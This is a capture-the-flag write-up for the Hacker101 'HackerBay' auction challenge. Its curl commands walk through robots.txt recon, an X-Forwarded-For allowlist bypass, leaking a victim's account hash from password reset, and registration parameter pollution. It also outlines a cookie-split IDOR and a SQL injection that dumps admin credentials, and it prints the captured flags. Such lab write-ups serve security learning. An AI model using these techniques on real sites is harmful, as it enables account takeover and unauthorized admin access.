# Grayhatcon CTF — HackerBay (Hacker101)

Auction site: leaked **HackerOne** credentials are listed as an auction; goal is to reach admin flows and (full solve) **delete that listing**. Hints: **recon** (`robots.txt`), **hidden form fields**, **IP allowlists**, **cookie/body mismatches**, and (final stage) **SQL injection** in an authenticated JSON endpoint.

> Replace `BASE` with your instance, e.g. `https://bddae40402773c77b30d51778f97c09e.ctf.hacker101.com`.

Community walkthroughs: [Grayhatcon CTF.md (8r0wn13)](https://github.com/8r0wn13/hacker101_ctf/blob/main/Grayhatcon%20CTF.md) · [Bug Bounty Summit / Grayhatcon (krash.dev)](https://krash.dev/posts/bug-bounty-summit-ctf-writeup) (clearer end-to-end, including IDOR cookie split and SQLi).

---

## 1. Recon — `robots.txt` and hidden admin path

`GET $BASE/robots.txt` disallows **`/s3cr3t-4dm1n/`**. Fuzzing that directory turns up **`.htaccess`** (often **200** when the file is exposed).

```bash
curl -sS "$BASE/robots.txt"
curl -sS "$BASE/s3cr3t-4dm1n/.htaccess"
```

---

## 2. IP allowlist bypass — first flag on admin splash

`.htaccess` uses Apache **`Allow from 8.8.8.8`** / **`8.8.4.4`**. The app trusts **`X-Forwarded-For`** (or similar client-IP headers), so you can present as an allowed address:

```bash
curl -sS -H 'X-Forwarded-For: 8.8.8.8' "$BASE/s3cr3t-4dm1n/" | grep -oE '\^FLAG\^[^$]+\$FLAG\$'
```

**Example (this instance):** `^FLAG^0e4437e5917277dc7e9d374398b39831388db0020bee3ffcb40a11eb96b1338d$FLAG$`

You should see an **admin login** form (credentials come later from the SQLi path in the references above).

---

## 3. Leak `hunter2`’s account identifier — password reset

`POST /reset` with **`username=hunter2`** returns a second step that includes a **hidden `account_hash`** (used as the victim “owner” identifier in later steps).

```bash
curl -sS -X POST "$BASE/reset" -d 'username=hunter2' | grep -oE 'account_hash" value="[a-f0-9]+"' | head -1
```

On this deployment that value was: **`cf505baebbaf25a0a4c63eb93331eb36`**.

---

## 4. Register a sub-account under `hunter2` — extra form fields

The public **`POST /register`** body normally only sends `new_username` / `new_password`. The app also understands parameters used elsewhere (sub-user / owner binding).

### 4a. `account_hash` (from reset)

Add the leaked hash so the new user is created **under `hunter2`**, then **log in** and open **`/dashboard`**. A flag is shown in the dashboard banner when that path is intended for first-time subusers.

```bash
curl -sS -c jar.txt -X POST "$BASE/register" \
  -d 'account_hash=cf505baebbaf25a0a4c63eb93331eb36' \
  -d 'new_username=yoursub&new_password=yourpass'
curl -sS -b jar.txt -X POST "$BASE/login" -d 'username=yoursub&password=yourpass'
curl -sS -b jar.txt "$BASE/dashboard" | grep -oE '\^FLAG\^[^$]+\$FLAG\$'
```

**Example flag (earlier run on this host):** `^FLAG^cedaccc3e7755a73464a6ccfa6363c19e04b275ef1aca881bfe60a1907225b20$FLAG$`

### 4b. `owner_hash` (same value; different response branch)

[krash.dev](https://krash.dev/posts/bug-bounty-summit-ctf-writeup) uses **`owner_hash`** on **`/register`** instead of `account_hash`. On this instance that produced the **“Awaiting Activation”** page with a **second** flag:

```bash
curl -sS -L -c jar2.txt -X POST "$BASE/register" \
  -d 'owner_hash=cf505baebbaf25a0a4c63eb93331eb36' \
  -d 'new_username=otheruser&new_password=yourpass' | grep -oE '\^FLAG\^[^$]+\$FLAG\$'
```

**Example (this instance):** `^FLAG^2f3bbc4e6a3bca35b68d044126df4495dc5cc03887886b294520a3348f826e38$FLAG$`

Exact flag **order** and **field names** can vary slightly between instances; the core idea is **parameter pollution / missing validation on registration**.

---

## 5. “Enable sub-user” IDOR — cookie vs `token` (see references)

Privileged accounts can open **`/dashboard/subusers`**, create sub-users, and **enable** them. The server should tie **`enable`** actions to the logged-in owner, but historically it keyed off the **`userhash` cookie** while **`token`** drove session identity.

Technique (from [krash.dev](https://krash.dev/posts/bug-bounty-summit-ctf-writeup)):

1. Log in as **your** main user; copy the **`token`** cookie.
2. Set **`userhash`** to **`hunter2`’s** main account hash (`cf505bae…` from reset).
3. `POST /dashboard/subusers` with the victim sub-user’s **`hash`** and **`enable_toggle=enable`**.

[8r0wn13](https://github.com/8r0wn13/hacker101_ctf/blob/main/Grayhatcon%20CTF.md) describes an alternate **Burp** workflow (two-step forward) that adds **`hash=…`** and **`enable_toggle=enable`** onto the **create sub-user** request body.

On **this** instance the simple split-cookie request did **not** surface a new flag in automated tests (likely stricter validation or state). If you get stuck, mirror the Burp sequencing from the linked write-ups, then **log in as the victim sub-user** and re-check **`/dashboard`** for a new flag.

---

## 6. Final flag — SQLi on `auctions/questions` + delete listing

Described in detail on [krash.dev](https://krash.dev/posts/bug-bounty-summit-ctf-writeup):

- Authenticated **`GET /dashboard/auctions/questions?id=…`** returns JSON (`name`, `questions`, `auctions`).
- Inject via **`id`** with nested **`UNION`** payloads to satisfy JSON shape expectations.
- Escalate to **`information_schema`**, then dump **`admin`** credentials.
- Log into **`/s3cr3t-4dm1n/`** with those credentials, supply the **auction identifier** for the HackerOne leak listing, and **delete** it to receive the last flag.

This step requires an account that can reach the **auction-creation** UI (often **confirmed** main users); follow the reference payloads and column counts from the article.

---

## Quick map

| Stage | Technique |
|-------|-----------|
| Recon | `robots.txt` → **`s3cr3t-4dm1n`**, directory + `.htaccess` |
| Admin splash | **`X-Forwarded-For: 8.8.8.8`** (or `8.8.4.4`) |
| Victim id | **`POST /reset`** → hidden **`account_hash`** for `hunter2` |
| Sub-user flags | Extra **`account_hash`** / **`owner_hash`** on **`POST /register`** |
| Enable IDOR | Forged **`userhash`** + real **`token`** + **`POST …/subusers`** (see links) |
| Finale | **SQLi** on **`/dashboard/auctions/questions`** → **admin** → **delete auction** |

---

## License

Challenge content is © HackerOne / Hacker101. These notes are for education only.
